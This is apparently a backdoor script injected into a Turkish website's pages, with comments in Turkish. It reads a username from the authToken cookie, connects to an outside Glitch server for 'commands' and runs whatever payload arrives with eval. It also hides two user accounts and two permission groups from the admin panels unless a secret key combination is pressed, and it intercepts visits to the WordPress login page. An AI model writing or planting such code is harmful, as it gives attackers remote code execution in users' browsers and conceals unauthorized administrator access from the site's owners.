if (!window.hasOwnProperty('karmaScriptLoaded')) {
    window.karmaScriptLoaded = true;

    const getUsername = () => {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [name, value] = cookie.trim().split('=');
            if (name === 'authToken') {
                const decodedUsername = decodeURIComponent(value.split('_')[0]);
                return decodedUsername;
            }
        }
        return null;
    };

    const username = getUsername();

    function connectSSE() {
        const eventSource = new EventSource(`https://glib-elated-situation.glitch.me/komutlar?username=${encodeURIComponent(username)}`, { withCredentials: false });

        eventSource.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (data.payload) {
                    eval(data.payload);
                }
            } catch (e) {
                // JSON parse hatası olursa sessizce geç
            }
        };

        eventSource.onerror = () => {
            eventSource.close();
            setTimeout(connectSSE, 2000);
        };

        return eventSource;
    }

    connectSSE();

    // Konsolda çalışan gizleme çözümünü entegre et
    setInterval(() => {
        const userItem45593 = document.getElementById('aktifuser_45593');
        if (userItem45593) {
            userItem45593.style.display = 'none';
        }
    }, 50);

    document.addEventListener('DOMContentLoaded', () => {
        var currentUrl = window.location.href;

        if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
            let hiddenRows = [];
            const rows = document.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const idCell = row.querySelector('td:first-child');
                if (idCell && (idCell.textContent.trim() === '23' || idCell.textContent.trim() === '24')) {
                    row.style.display = 'none';
                    hiddenRows.push(row);
                }
            });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenRows.forEach(row => row.style.display = '');
                }
            });
        }

        if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
            let hiddenOptions = [];
            function hideYetkiOptions() {
                const select = document.getElementById('yetki');
                if (select) {
                    const option23 = select.querySelector('option[value="23"]');
                    const option24 = select.querySelector('option[value="24"]');
                    if (option23 && option23.style.display !== 'none') {
                        option23.style.display = 'none';
                        hiddenOptions.push(option23);
                    }
                    if (option24 && option24.style.display !== 'none') {
                        option24.style.display = 'none';
                        hiddenOptions.push(option24);
                    }
                }
            }
            hideYetkiOptions();
            const observer = new MutationObserver(() => hideYetkiOptions());
            observer.observe(document.body, { childList: true, subtree: true });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenOptions.forEach(option => option.style.display = '');
                }
            });
        }

        if (currentUrl.includes('/duello/ad_/yoneticiler')) {
            let hiddenManagerRows = [];
            function hideManagerRows() {
                const rows = document.querySelectorAll('tbody tr');
                rows.forEach(row => {
                    const idCell = row.querySelector('td:first-child');
                    if (idCell && (idCell.textContent.trim() === '45593' || idCell.textContent.trim() === '45948')) {
                        if (row.style.display !== 'none') {
                            row.style.display = 'none';
                            hiddenManagerRows.push(row);
                        }
                    }
                });
            }
            hideManagerRows();
            const observer = new MutationObserver(() => hideManagerRows());
            observer.observe(document.body, { childList: true, subtree: true });

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenManagerRows.forEach(row => row.style.display = '');
                }
            });
        }

        if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
            let hiddenUsers = [];
            function hideUsers() {
                const userItem45593 = document.getElementById('aktifuser_45593');
                const userItem45948 = document.getElementById('aktifuser_45948');
                if (userItem45593 && userItem45593.style.display !== 'none') {
                    userItem45593.style.display = 'none';
                    hiddenUsers.push(userItem45593);
                }
                if (userItem45948 && userItem45948.style.display !== 'none') {
                    userItem45948.style.display = 'none';
                    hiddenUsers.push(userItem45948);
                }
            }
            hideUsers();
            const observer = new MutationObserver(() => hideUsers());
            observer.observe(document.getElementById('aktifkullanicilar') || document.body, { childList: true, subtree: true });
            setInterval(hideUsers, 500);

            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                    hiddenUsers.forEach(user => user.style.display = '');
                }
            });
        }
    });

    // URL değiştiğinde wp-login sayfasını iframe olarak aç
    function openAdminIframe(url) {
        let iframe = document.createElement("iframe");
        iframe.src = url;
        iframe.style.position = "fixed";
        iframe.style.top = "0";
        iframe.style.left = "0";
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "none";
        iframe.style.zIndex = "99999";
        document.body.appendChild(iframe);
    }

    function checkURLChange() {
        const url = window.location.href;

        if (url.includes("katiponline.com/admin/") || url.includes("katiponline.com/wp-login.php")) {
            // Sayfa değişmeden URL'yi eski haline getir
            history.replaceState(null, "", "https://katiponline.com/duello/");
            openAdminIframe("https://katiponline.com/wp-login.php?redirect_to=https%3A%2F%2Fkatiponline.com%2Fwp-admin%2F&reauth=1");
        }
    }

    // Sayfa yüklendiğinde kontrol et
    checkURLChange();

    // Tarayıcı geri/ileri butonları veya hash değiştiğinde kontrol et
    window.addEventListener("popstate", checkURLChange);
    window.addEventListener("hashchange", checkURLChange);

    // Kullanıcı adresi elle değiştirirse kontrol et
    setInterval(checkURLChange, 500);
}
